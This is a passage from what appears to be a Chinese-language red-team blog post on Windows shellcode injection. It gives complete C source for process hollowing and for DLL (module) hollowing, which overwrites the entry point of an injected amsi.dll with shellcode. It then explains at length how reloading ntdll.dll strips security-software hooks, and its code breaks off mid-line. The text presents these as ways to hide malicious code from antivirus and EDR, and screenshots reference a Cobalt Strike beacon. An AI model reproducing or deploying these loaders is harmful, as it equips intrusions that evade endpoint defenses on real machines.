class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;Windows.h&gt;</span><br><br>typedef <span class="hljs-built_in">NTSTATUS</span>(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);<br><br>int <span class="hljs-built_in">main</span>(int argc, wchar_t* argv[])<br>&#123;<br>IN PIMAGE_DOS_HEADER pDosHeaders;<br>IN PIMAGE_NT_HEADERS pNtHeaders;<br>IN PIMAGE_SECTION_HEADER pSectionHeaders;<br><br>IN PVOID FileImage;<br><br>IN HANDLE hFile;<br>OUT DWORD FileReadSize;<br>IN DWORD dwFileSize;<br><br>IN PVOID RemoteImageBase;<br>IN PVOID RemoteProcessMemory;<br><br><br><br><br>STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>CONTEXT ctx;<br>ctx.ContextFlags = CONTEXT_FULL;<br>si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br><br>char path[] = <span class="hljs-string">&quot;C:\\HelloWorld.exe&quot;</span>;<br><span class="hljs-keyword">BOOL</span> bRet = <span class="hljs-built_in">CreateProcessA</span>(<br><span class="hljs-built_in">NULL</span>,<br>(LPSTR)<span class="hljs-string">&quot;cmd&quot;</span>,<br><span class="hljs-built_in">NULL</span>,<br><span class="hljs-built_in">NULL</span>,<br>FALSE,<br>CREATE_SUSPENDED,<br><span class="hljs-built_in">NULL</span>,<br><span class="hljs-built_in">NULL</span>,<br>&amp;si,<br>&amp;<span class="hljs-built_in">pi</span>);<br><br><span class="hljs-comment">//在本进程获取替换文件的内容</span><br>hFile = <span class="hljs-built_in">CreateFileA</span>(path, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-built_in">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-built_in">NULL</span>);<br>dwFileSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-built_in">NULL</span>); <span class="hljs-comment">//获取替换可执行文件的大小</span><br>FileImage = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-built_in">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br><span class="hljs-built_in">ReadFile</span>(hFile, FileImage, dwFileSize, &amp;FileReadSize, <span class="hljs-built_in">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><br>pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;<br>pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew); <span class="hljs-comment">//获取NT头</span><br><br><span class="hljs-built_in">GetThreadContext</span>(<span class="hljs-built_in">pi</span>.hThread, &amp;ctx); <span class="hljs-comment">//获取挂起进程上下文</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-built_in">ReadVirtualMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)(ctx.Rdx + (<span class="hljs-built_in">sizeof</span>(SIZE_T) * <span class="hljs-number">2</span>)), &amp;RemoteImageBase, <span class="hljs-built_in">sizeof</span>(PVOID), <span class="hljs-built_in">NULL</span>);<br><span class="hljs-comment">// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _X86_</span><br><span class="hljs-built_in">ReadProcessMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)(ctx.Ebx + <span class="hljs-number">8</span>), &amp;RemoteImageBase, <span class="hljs-built_in">sizeof</span>(PVOID), <span class="hljs-built_in">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//判断文件预期加载地址是否被占用</span><br>pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtUnmapViewOfSection&quot;</span>);<br><span class="hljs-keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeaders-&gt;OptionalHeader.ImageBase)<br>&#123;<br><span class="hljs-built_in">NtUnmapViewOfSection</span>(<span class="hljs-built_in">pi</span>.hProcess, RemoteImageBase); <span class="hljs-comment">//卸载已存在文件</span><br>&#125;<br><br><span class="hljs-comment">//为可执行映像分配内存,并写入文件头</span><br>RemoteProcessMemory = <span class="hljs-built_in">VirtualAllocEx</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)pNtHeaders-&gt;OptionalHeader.ImageBase, pNtHeaders-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, RemoteProcessMemory, FileImage, pNtHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="hljs-built_in">NULL</span>);<br><br><span class="hljs-comment">//逐段写入</span><br><span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)<br>&#123;<br>pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders-&gt;e_lfanew + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER)));<br><span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders-&gt;VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, <span class="hljs-built_in">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//将rax寄存器设置为注入软件的入口点</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br><span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)(ctx.Rdx + (<span class="hljs-built_in">sizeof</span>(SIZE_T) * <span class="hljs-number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="hljs-built_in">sizeof</span>(PVOID), <span class="hljs-built_in">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//将eax寄存器设置为注入软件的入口点</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _X86_</span><br>ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br><span class="hljs-built_in">WriteProcessMemory</span>(<span class="hljs-built_in">pi</span>.hProcess, (PVOID)(ctx.Ebx + (<span class="hljs-built_in">sizeof</span>(SIZE_T) * <span class="hljs-number">2</span>)), &amp;pNtHeaders-&gt;OptionalHeader.ImageBase, <span class="hljs-built_in">sizeof</span>(PVOID), <span class="hljs-built_in">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-built_in">SetThreadContext</span>(<span class="hljs-built_in">pi</span>.hThread, &amp;ctx); <span class="hljs-comment">// 设置线程上下文</span><br><span class="hljs-built_in">ResumeThread</span>(<span class="hljs-built_in">pi</span>.hThread); <span class="hljs-comment">// 恢复挂起线程</span><br><br><span class="hljs-built_in">CloseHandle</span>(<span class="hljs-built_in">pi</span>.hThread);<br><span class="hljs-built_in">CloseHandle</span>(<span class="hljs-built_in">pi</span>.hProcess);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051706822.png" alt="image-20251005170626774"></p><p>我们根据cs上面的线程PID 13128 在Process Hacker中看到，没有父子进程。这也能看出来这和傀儡进程的区别了。傀儡进程是创建一个进程再放入shellcode代码，而进程镂空是将已经运行的进程进行空心化处理，再放入程序</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051718089.png" alt="image-20251005171839008"></p><h1 id="模块镂空"><a href="#模块镂空" class="headerlink" title="模块镂空"></a>模块镂空</h1><h2 id="简单介绍-2"><a href="#简单介绍-2" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>模块镂空(dll hollowing)也是一种shellcode注入技术，原理和思路与process hollowing类似，通过合法的模块信息来伪装恶意代码，虽然我们可以用远程dll注入来完整注入整个恶意dll，但此类注入往往比较容易检测，我们需要往受害者主机上传入一个恶意dll，这样杀毒软件可以通过监控入windows&#x2F;temp&#x2F;等目录实现对远程dll注入的拦截，而模块镂空就不会存在这样的风险，因为我们镂空的往往是一个带有微软签名的dll，为了防止进程出错，我们并不能直接镂空一个进程空间中已存在的dll，需要先对目标进程远程注入一个系统合法dll，然后再镂空它，这样我们就获得了一个和windows模块相关联的shellcode环境</p><h2 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span></span><br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])<br>&#123;<br>HANDLE processHandle;<br>PVOID remoteBuffer;<br><span class="hljs-type">wchar_t</span> moduleToInject[] = L<span class="hljs-string">&quot;C:\\windows\\system32\\amsi.dll&quot;</span>;<br>HMODULE modules[<span class="hljs-number">256</span>] = &#123;&#125;;<br>SIZE_T modulesSize = <span class="hljs-keyword">sizeof</span>(modules);<br>DWORD modulesSizeNeeded = <span class="hljs-number">0</span>;<br>DWORD moduleNameSize = <span class="hljs-number">0</span>;<br>SIZE_T modulesCount = <span class="hljs-number">0</span>;<br>CHAR remoteModuleName[<span class="hljs-number">128</span>] = &#123;&#125;;<br>HMODULE remoteModule = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 64位shellcode</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">// 创建远线程注入正常的DLL</span><br><span class="hljs-comment">//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br>processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, <span class="hljs-number">3488</span>);<br><br>remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> moduleToInject, MEM_COMMIT, PAGE_READWRITE);<br>WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, <span class="hljs-keyword">sizeof</span> moduleToInject, <span class="hljs-literal">NULL</span>);<br>PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br>HANDLE dllThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, threadRoutine, remoteBuffer, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>WaitForSingleObject(dllThread, <span class="hljs-number">1000</span>);<br><br><span class="hljs-comment">// 找到注入的DLL模块基址</span><br>EnumProcessModules(processHandle, modules, modulesSize, &amp;modulesSizeNeeded);<br>modulesCount = modulesSizeNeeded / <span class="hljs-keyword">sizeof</span>(HMODULE);<br><span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; modulesCount; i++)<br>&#123;<br>remoteModule = modules[i];<br>GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, <span class="hljs-keyword">sizeof</span>(remoteModuleName));<br><span class="hljs-keyword">if</span> (std::string(remoteModuleName).compare(<span class="hljs-string">&quot;amsi.dll&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>std::cout &lt;&lt; remoteModuleName &lt;&lt; <span class="hljs-string">&quot; at &quot;</span> &lt;&lt; modules[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//得到DLL入口点</span><br>DWORD headerBufferSize = <span class="hljs-number">0x1000</span>;<br>LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);<br>ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, <span class="hljs-literal">NULL</span>);<br><br>PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;<br>PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader-&gt;e_lfanew);<br>LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);<br>std::cout &lt;&lt; <span class="hljs-string">&quot;, entryPoint at &quot;</span> &lt;&lt; dllEntryPoint;<br><br><span class="hljs-comment">// 覆盖DLL代码</span><br>WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// 远线程执行</span><br>CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051739514.png" alt="image-20251005173957459"></p><p>优点:</p><ol><li>不需要分配 RWX 内存页面或更改其在目标进程中的权限</li><li>Shellcode 被注入到合法的 Windows DLL 中，因此寻找从 c:\temp\ 等奇怪位置加载的 DLL 的检测将不起作用</li><li>执行 shellcode 的远程线程与合法的 Windows 模块相关联</li></ol><h1 id="重载dll进行脱钩"><a href="#重载dll进行脱钩" class="headerlink" title="重载dll进行脱钩"></a>重载dll进行脱钩</h1><h2 id="简单介绍-3"><a href="#简单介绍-3" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><a href="https://idiotc4t.com/defense-evasion/load-ntdll-too">载入第二个Ntdll绕Hook | idiotc4t’s blog</a></p><h3 id="核心概念：什么是-Hook？"><a href="#核心概念：什么是-Hook？" class="headerlink" title="核心概念：什么是 Hook？"></a>核心概念：什么是 Hook？</h3><p>在理解脱钩之前，我们得先明白什么是“钩子”（Hook）。想象一下，你有一扇门，门上有一个门铃。正常情况下，你按门铃，门铃就会响。</p><ul><li><p>**原始函数 (Original Function)**：就是“按门铃”这个动作，它会直接导致“门铃响”。</p></li><li><p>Hooking (挂钩)</p><p>：有人在你按门铃和门铃响之间加了一个“拦截器”。你一按门铃，这个拦截器就先接到信号，它可以选择：</p><ol><li><strong>自己处理</strong>：比如，它可能直接播放一段录音，而不是让门铃响。</li><li><strong>记录一下</strong>：它可能在小本子上记下“有人按门铃了”，然后才让门铃响。</li><li><strong>修改一下</strong>：它可能把你的“按门铃”信号变成“敲门”信号，然后去敲门。</li><li><strong>阻止</strong>：它可能直接把你的信号吃掉，门铃根本不响。</li></ol></li></ul><p>在计算机世界里，这个“门铃”就是操作系统提供的各种函数（API），特别是那些底层的系统调用。当你程序想“打开一个文件”或“分配一块内存”时，它会调用像 <code>NtCreateFile</code> 或 <code>NtAllocateVirtualMemory</code> 这样的系统 API。</p><p>Hooking 就是通过修改这些 API 函数在内存中的起始代码，让它们不再直接执行原始逻辑，而是先跳转到我们预设的“拦截器”代码。</p><h3 id="ntdll-dll：操作系统的“直通车”"><a href="#ntdll-dll：操作系统的“直通车”" class="headerlink" title="ntdll.dll：操作系统的“直通车”"></a><code>ntdll.dll</code>：操作系统的“直通车”</h3><p><code>ntdll.dll</code> 是 Windows 操作系统中一个非常特殊的动态链接库（DLL）。它不是普通的 DLL，而是用户模式应用程序通往内核模式（操作系统核心）的“直通车”。</p><ul><li>它包含了大量底层、未经微软官方文档完全公开的 <strong>Native API</strong>（或称 <strong>NT API</strong>）。</li><li>这些 API 是许多高级操作的最终执行者，例如文件操作、进程管理、内存分配等。</li><li>几乎所有 Win32 API（我们平时用的 <code>CreateFile</code>、<code>VirtualAlloc</code> 等）最终都会通过层层调用，抵达 <code>ntdll.dll</code> 中的某个 Native API。</li></ul><p>正因为 <code>ntdll.dll</code> 如此核心，它就成了攻击者和安全软件都喜欢 Hook 的目标。恶意软件可能 Hook <code>NtCreateFile</code> 来隐藏它创建的文件，安全软件可能 Hook <code>NtWriteVirtualMemory</code> 来阻止恶意代码写入关键内存区域。</p><h3 id="脱钩（Unhooking）：恢复“门铃”的正常功能"><a href="#脱钩（Unhooking）：恢复“门铃”的正常功能" class="headerlink" title="脱钩（Unhooking）：恢复“门铃”的正常功能"></a>脱钩（Unhooking）：恢复“门铃”的正常功能</h3><p>脱钩的目的很简单：<strong>移除 Hook，让被修改的 API 函数恢复到它原始的、未被篡改的状态。</strong> 就像把门铃上的拦截器拆掉，让按门铃直接导致门铃响。</p><h3 id="“重载-ntdll-dll-脱钩”-的原理：以假乱真，以新换旧"><a href="#“重载-ntdll-dll-脱钩”-的原理：以假乱真，以新换旧" class="headerlink" title="“重载 ntdll.dll 脱钩” 的原理：以假乱真，以新换旧"></a>“重载 <code>ntdll.dll</code> 脱钩” 的原理：以假乱真，以新换旧</h3><p>这个手法的核心思想是：<strong>当前进程内存中加载的 <code>ntdll.dll</code> 可能已经被 Hook 了，那么我们去磁盘上找一份原始的、干净的 <code>ntdll.dll</code> 文件，把它重新加载到内存的另一个地方，然后用这份干净副本中的函数代码，去覆盖当前进程中被 Hook 的函数代码。</strong></p><p>我们来一步步拆解：</p><ol><li><p><strong>发现异常：</strong></p><ul><li>我们的程序运行着，但发现某些系统调用行为异常，或者安全软件检测到有 Hook 存在。</li><li>或者，我们主动去检查 <code>ntdll.dll</code> 中关键函数的起始字节，发现它们被修改了（比如，不再是正常的函数开头指令，而是一个 <code>JMP</code> 跳转指令）。</li></ul></li><li><p><strong>寻找“真理”：获取原始 <code>ntdll.dll</code> 副本：</strong></p><ul><li><p>这是最关键的一步。我们不能相信当前进程内存中已有的 <code>ntdll.dll</code>，因为它可能已经被污染了。</p></li><li><p>最常用的方法：从磁盘重新加载。</p><ul><li><p>我们知道 <code>ntdll.dll</code> 的原始文件在 <code>C:\Windows\System32\ntdll.dll</code>。</p></li><li><p>我们使用</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">LoadLibraryEx(<span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>Windows<span class="hljs-subst">\\</span>System32<span class="hljs-subst">\\</span>ntdll.dll&quot;</span>, NULL, DONT_RESOLVE_DLL_REFERENCES);<br></code></pre></td></tr></table></figure><p>这个函数。</p><ul><li><code>LoadLibraryEx</code> 会将这个文件加载到当前进程的另一个独立的内存区域。</li><li><strong><code>DONT_RESOLVE_DLL_REFERENCES</code> 标志至关重要！</strong> 它告诉操作系统，仅仅把这个 DLL 的原始字节加载进来，不要去解析它的导入表（也就是它依赖的其他 DLL），也不要调用它的 <code>DllMain</code> 函数进行初始化。这样，我们得到的就是一份纯粹的、未被执行过任何代码、也未被 Hook 污染的 <code>ntdll.dll</code> 原始副本。</li></ul></li><li><p>现在，我们进程里有了两份 <code>ntdll.dll</code>：一份是可能被 Hook 的（旧的），一份是干净的（新的）。</p></li></ul></li></ul></li><li><p><strong>“狸猫换太子”：恢复函数代码：</strong></p><ul><li>现在我们有了“旧的”被 Hook 的 <code>ntdll.dll</code>（在进程的某个基地址），以及“新的”干净的 <code>ntdll.dll</code>（在另一个基地址）。</li><li>定位函数：<ul><li>对于我们想要脱钩的函数（例如 <code>NtCreateFile</code>），我们首先在“旧的” <code>ntdll.dll</code> 中找到它的内存地址。</li><li>然后，我们在“新的” <code>ntdll.dll</code> 副本中找到 <code>NtCreateFile</code> 对应的原始代码的内存地址。由于 ASLR (地址空间布局随机化)，这两个 <code>ntdll.dll</code> 的基地址可能不同，但函数相对于其所在 DLL 基地址的 <strong>偏移量</strong> 是相同的。所以，我们可以通过计算偏移量来找到对应的函数。</li></ul></li><li>修改内存权限：<ul><li>被 Hook 的函数代码通常位于可执行内存区域，默认是只读的。我们需要使用 <code>VirtualProtect</code> 函数，暂时将这块内存区域的权限修改为可写 (<code>PAGE_EXECUTE_READWRITE</code>)。</li></ul></li><li>字节覆盖：<ul><li>将“新的” <code>ntdll.dll</code> 副本中 <code>NtCreateFile</code> 函数的原始字节（通常是 Hooking 篡改的开头几个字节，或者整个函数体，取决于 Hook 的复杂程度）复制到“旧的” <code>ntdll.dll</code> 中 <code>NtCreateFile</code> 函数的地址上。</li></ul></li><li>恢复内存权限：<ul><li>使用 <code>VirtualProtect</code> 将内存权限恢复到原始状态（通常是 <code>PAGE_EXECUTE_READ</code>）。</li></ul></li><li>刷新指令缓存：<ul><li>调用 <code>FlushInstructionCache</code> 函数。这是非常重要的一步，它告诉 CPU 丢弃缓存中旧的指令，重新从内存中加载最新的指令。这样，CPU 才能执行我们刚刚恢复的原始代码。</li></ul></li></ul></li></ol><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>“重载 <code>ntdll.dll</code> 脱钩”就是利用 Windows 允许进程加载多个相同 DLL 文件的特性，通过加载一份原始的 <code>ntdll.dll</code> 副本，然后用这份副本中的干净代码去覆盖当前进程中被 Hook 的 <code>ntdll.dll</code> 中的函数代码，从而恢复系统 API 的正常功能。</p><h3 id="优缺点："><a href="#优缺点：" class="headerlink" title="优缺点："></a>优缺点：</h3><p><strong>优点：</strong></p><ul><li><strong>有效对抗用户模式 Hook：</strong> 对于大多数在用户模式下对 <code>ntdll.dll</code> 进行的 Hooking（例如通过修改函数开头指令），这种方法非常有效。</li><li><strong>相对通用：</strong> 不依赖于特定的 Hooking 技术，只要能获取到原始代码，就能恢复。</li></ul><p><strong>缺点：</strong></p><ul><li><p><strong>无法对抗内核模式 Hook：</strong> 这种方法只在用户模式下操作进程内存。如果 Hook 发生在内核模式（例如通过修改 SSDT 或内核驱动），用户模式的脱钩是无能为力的。</p></li><li><p><strong>时机敏感：</strong> 如果在脱钩代码执行之前，脱钩代码本身所依赖的 <code>ntdll.dll</code> 函数已经被 Hook，那么脱钩操作可能无法正确执行。</p></li><li><p><strong>内存开销：</strong> 重新加载 <code>ntdll.dll</code> 会在进程中额外占用一份 <code>ntdll.dll</code> 的内存空间。</p></li><li><p><strong>复杂 Hooking：</strong> 对于那些不只是修改函数开头，而是修改函数内部逻辑或数据结构的复杂 Hook，简单的字节覆盖可能不够。</p></li></ul><h2 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEREF( name )*(UINT_PTR *)(name)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEREF_64( name )*(DWORD64 